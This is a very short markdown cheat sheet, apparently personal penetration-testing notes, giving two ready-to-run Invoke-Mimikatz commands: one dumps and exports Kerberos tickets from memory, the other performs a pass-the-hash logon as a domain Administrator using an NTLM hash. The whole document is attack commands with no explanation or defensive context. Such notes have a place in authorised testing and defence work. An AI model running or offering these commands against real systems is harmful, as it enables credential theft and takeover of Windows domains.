## Mimikatz dump tickets


```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

## Mimikatz pass the hashes

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:some.domain.local /ntlm:brydaafdsafd3524frw4fe4f"'
```
